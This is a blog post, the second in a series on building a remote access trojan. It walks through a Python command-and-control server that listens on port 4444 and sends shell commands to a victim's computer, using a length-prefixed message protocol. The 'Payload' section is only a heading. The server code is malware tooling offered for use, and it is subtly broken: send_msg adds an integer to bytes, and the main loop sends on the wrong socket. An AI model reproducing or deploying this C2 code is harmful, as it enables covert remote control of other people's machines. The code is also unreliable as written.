---
layout: single
title: (2) RAT Dev - Creating a simple Server and Payload
categories: ratdev
---
In the last blog post I talked about the general plans and goals of this RAT, in this post I'll be creating a very simple C2 Server and the Payload.

For now I want to create the structure for a Reverse Shell, this will allow me to execute shell commands on the victims computer. 

Let's get started!

## The Server

To begin with I'll start by creating the server, the server will be coded in Python, which in my opinion is one of the best languages for something like this.

I'm creating a Reverse shell, so the structure of the server will look like this:

- Create a new socket, bind it and listen for new connections
- Accept the first connection
- Ask for an input from the server host, this will be the shell command
- Send the command to the victim
- (Victim runs the command and returns the output)
- Receive the output, then print it to the screen
- Ask for a new input

```python
import socket
import struct

# Create new socket object, i'll be using TCP for communication
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
# Bind the socket to my local address on port 4444
sock.bind(('', 4444))
# Listen for connections
sock.listen()

# Accept the first connection
c_sock, _ = sock.accept()
```

Perfect, the code creates the server, binds it to my IP address and listens for new connections. Then accepts the first connection, I won't be accepting multiple connections at the same time (for now).

Before we send any commands I want to talk about the messaging protocol I'm going to use, for those who don't know, the TCP Protocol sends messages in streams of data.

The typical code for receiving data looks like this:
```python
data = sock.recv(1024)
```

This means that the socket will receive a message of up to 1024 bytes, what if our message is longer than that? Well, we could change it to a higher number, maybe 2048, 4096? I plan for files to be sent, and most files are above 4096 bytes. So this is a problem.

What if we set the byte number to something ridiculous like 10000000? In theory that would work, but because TCP works in streams of data if we tried to send a large number of bytes over multiple networks then the message would be split up into multiple smaller messages. If multiple messages come in at the same time we cant distinguish which bytes correspond to which message.  

A good place to start would be to send the **length of the message**, then the **actual message**. By doing this, the recipient knows exactly how many bytes to expect and can receive them all to form a message. In practice, how do we do that?

Lets say our message is: `hello`
We could send the message `5hello`, and expect the recipient to read the first byte, but this doesn't work for a message that is 10 bytes long. I'm not going to go through the entire process of why this wouldn't work, but believe me, it doesn't.

To fix this problem, I've created a messaging protocol that allows us to send the length of the message, then the actual message.

This is where these two messaging functions come in:

**Receive message**
```python
def recv_msg(sock: socket.socket) -> bytes:

	msg_len = sock.recv(4)
	msg_len = struct.unpack("!I", msg_len)[0]

	f_msg = b""

	while len(f_msg) < msg_len:
		f_msg += sock.recv(msg_len - len(f_msg))

	return f_msg
```

**Send message**
```python
def send_msg(sock: socket.socket, msg: bytes) -> None:

	f_msg = struct.pack("!I", len(msg) + msg)
	sock.sendall(f_msg)
```

### Send message

Let's start with the **send message** function first. It uses the function `struct.pack()` to convert the length of the message into the binary representation of an Integer. 

```python
struct.pack("!I", 5) -> b'\x00\x00\x00\x05'
```

The `I` tells the function to convert it into an integer that will be sent over the network. The output is the binary representation of an integer, with a length of **4** bytes.

The `!` tells the function to convert it into network order (big-endian) which is the standard for communicating bytes on a network.

You can go to the [struct documentation](https://docs.python.org/3/library/struct.html)for more information on this.

Look at what happens when I put a much larger number into this function:

```python
struct.pack("!I", 56457) -> b'\x00\x00\xdc\x89'
```

The output is still **4** bytes! It may look larger than that, but I assure you that's only Python changing the output to be printed into the console.  In the send message function, we get that struct and add it onto the start of the message. The final message for `hello` would be `b'\x00\x00\x00\x05Hello'`.

### Receive message

Now that we have sent that message, how do we receive it accurately?
All we need to do is receive 4 bytes, which tells us the length of the message, then use that to receive the full message.

The receive function:

- Receives the first 4 bytes, telling us the length of the message
- Uses `struct.unpack()` to convert that integer representation back into an actual number.
- Receives the entire message using a while loop

Remember when I talked about how TCP sends data over streams? If the data is large then the original message will be split up into smaller messages, so we cant simply do `sock.recv(msg_len)`. 

Let's say our message is **2000** bytes.
First we try `sock.recv(2000)`, but only receive 567 bytes (this is not a set number, it can vary).
Our current message length is **567** bytes, so we need to receive **1,433** more bytes to complete the message, the while loop continues this process until the length of our final message matches with the expected message length.
Once the expected message length has been achieved, it will break out from the loop and return the message.

### Finishing touches

Now all we need to do is ask for an input (the command), send the command and receive the commands output. Like this:

```python
while True:

	cmd = input("Enter command: ")
	# input() returns a string, so we need to convert cmd into bytes
	send_msg(sock, bytes(cmd, 'utf-8'))

	output = recv_msg(sock)
	# recv_msg() returns bytes, so convert it into a string for better readability
	print(output.decode('utf-8'))
```

The entire server looks like this:

```python
import socket
import struct

print("Run")
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.bind(('', 4444))
sock.listen()

c_sock, _ = sock.accept()
print("Got a connection!")

def recv_msg(sock: socket.socket) -> bytes:

	msg_len = sock.recv(4)
	msg_len = struct.unpack("!I", msg_len)[0]

	f_msg = b""

	while len(f_msg) < msg_len:
		f_msg += sock.recv(msg_len - len(f_msg))

	return f_msg

def send_msg(sock: socket.socket, msg: bytes) -> None:

	f_msg = struct.pack("!I", len(msg) + msg)
	sock.sendall(f_msg)

while True:

	cmd = input("Enter command: ")
	send_msg(sock, bytes(cmd, 'utf-8'))

	output = recv_msg(sock)
	print(output)
```

**NOTE**: There is no error handling in this code, if the victim disconnects while we are sending our message the code will stop execution. This can be implemented later though.

## The Payload
